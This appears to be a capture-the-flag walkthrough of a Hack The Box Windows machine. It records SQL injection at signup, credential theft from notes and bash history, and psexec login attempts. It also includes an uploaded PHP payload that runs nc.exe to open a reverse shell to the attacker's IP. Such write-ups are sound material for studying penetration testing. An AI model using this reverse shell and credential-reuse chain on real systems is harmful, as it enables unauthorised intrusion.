#windows
# Initial Nmap Scan

![Pasted image 20230220120110](https://user-images.githubusercontent.com/71300144/220217556-37f2706b-3fe9-400e-9859-81ff99881c51.png)

# SMB

- Can not connect to SMB via anonymous

# Website on 80

![Pasted image 20230220120217](https://user-images.githubusercontent.com/71300144/220217591-bb30c1c7-6215-42d3-a59d-e9fc2ebc7a60.png)


- Login page present but can not find and SQL injection. Ran sqlmap
- did this by intercepting the POST request in BURP and saving it in a file called request.txt and running the following command `sqlmap -r request.txt`

![Pasted image 20230220120727](https://user-images.githubusercontent.com/71300144/220217672-dfccf0ad-cb74-4f89-8039-575381e39070.png)

- Lets sign up and see if there is sql injection on the sign up page
- sqlmap did not find any injectable values but it looks like it is vulnerable to cross site scripting.


- So if we use a sql injectectable value as the username and password we might be able to log in as an admin to the site

![Pasted image 20230220121435](https://user-images.githubusercontent.com/71300144/220217761-556b3255-b300-45d7-8479-e419f9aae9ef.png)

- Log in using these credentials

![Pasted image 20230220121735](https://user-images.githubusercontent.com/71300144/220217796-29d55191-c29c-47a0-9521-68a6df084505.png)

- Here you can see access to all notes including some credentials that look like it is for an smbshare
	- \\secnotes.htb\new-site
			tyler / 92g!mA8BGjOirkL%OG*&
- Now we are able to log into the smbshare

![Pasted image 20230220121839](https://user-images.githubusercontent.com/71300144/220217863-7029a64e-d14b-42d4-aadb-e2b90f04fe19.png)

- We can also see that this share is hosting an iis server which we saw in our initial nmap scan on port 8808

![Pasted image 20230220122318](https://user-images.githubusercontent.com/71300144/220217972-dc84d83c-2210-4a9a-a8fa-d02e034995fa.png)

- We can see that this is exactly the case
- Lets try a psexec for a quick win since we have some credentials
	- `python2 /usr/local/bin/psexec.py tyler:'92g!mA8BGjOirkL%OG*&'@10.10.10.97`
	- this does not work, so we have to try another way lets have another look at the site and see what kind of technology is hosted

![Pasted image 20230220123257](https://user-images.githubusercontent.com/71300144/220218011-13a080f7-c28a-4a26-81e9-3084f2790388.png)

- If we look a Wappalyze we can also see that th website is using PHP, we can take advantage of this since php is server side executed.

![Pasted image 20230220122720](https://user-images.githubusercontent.com/71300144/220218047-a19ff526-7eed-43ab-8cd6-452602917af6.png)

- lets try to upload nc.exe and a php reverse shell command to execute via server side after we access it on the website
	- NOTE: Ther is sometype of antivirus or defender firewall that is removing the files put into the smbshare every minute or two, so we have to act fast.
- Locate nc.exe and copy to current directory where you are logged into smb at 

![Pasted image 20230220123646](https://user-images.githubusercontent.com/71300144/220219818-969ff4df-8e1d-49dd-9603-eb88a4d34262.png)

- Create a php command that connects back to our machine 

`<?php system('nc.exe -e cmd.exe 10.10.14.8 9999') ?>`

This PHP command is using the `system()` function to execute a system command.

The command being executed is `nc.exe -e cmd.exe 10.10.14.8 9999`, which is running a program called `nc.exe` and passing it several arguments:

-   `-e` specifies that the following command should be executed after a connection is established.
-   `cmd.exe` is the command that will be executed after the connection is established. In this case, it is the Windows command prompt, which provides an interface for running Windows commands.
-   `10.10.14.8` is the IP address of the remote host that the connection will be made to.
-   `9999` is the port number to connect to on the remote host.

In summary, this command is using `nc.exe` to create a reverse shell to the remote host specified by IP address `10.10.14.8` on port `9999`.

![Pasted image 20230220124036](https://user-images.githubusercontent.com/71300144/220220017-1dac6271-5014-4e1a-9a85-a502f1b8fbb6.png)

- Now call the php-reverse.php file 

![Pasted image 20230220124145](https://user-images.githubusercontent.com/71300144/220220152-cbbad278-d88e-40ef-884e-70c3b01f5882.png)

- You should now have a shell

![Pasted image 20230220124211](https://user-images.githubusercontent.com/71300144/220220212-9eda6908-80fd-42f1-b021-4587dff82339.png)

- It was hinted to look for WSL (Windows Subsystem for Linux) the following commands were ran 
![[Pasted image 20230220124519.png]]

- If we take the file path found and ask whoami it returns root on the wsl.exe

![Pasted image 20230220124519](https://user-images.githubusercontent.com/71300144/220220315-3c9bfd86-ae50-48ad-ba31-f4722b366580.png)

- Runnign bash.exe 
- basic commands 
	- whoami
	- hostname
	- uname -a 
	- convert to a tty shell
		- `python -c "import pty;pty.spawn('/bin/bash')"`

![Pasted image 20230220124850](https://user-images.githubusercontent.com/71300144/220220358-48fdaaf2-3fc5-477e-a01e-96edffe8d9a9.png)

- Looking at history to see if there is anything interesting and we see some creds for admin accessing teh smbshare

![Pasted image 20230220125310](https://user-images.githubusercontent.com/71300144/220220508-e910f4dd-58ff-4af7-880b-c92368b084ef.png)

- Open a new tab and replace local IP for target IP and try to connect to the SMB share as admin. You are able to access it as admin

![Pasted image 20230220125423](https://user-images.githubusercontent.com/71300144/220220638-d0552c4f-224a-46ef-8d15-a1322690a3b6.png)

- THis is technically not a real shell so lets take the credentials we found and try the psexec command again, maybe the administrator re-used the password for other things

![Pasted image 20230220130226](https://user-images.githubusercontent.com/71300144/220220761-24137d93-8a8d-4dc0-b66a-8ba94f15d078.png)

`python2 /usr/local/bin/psexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97`

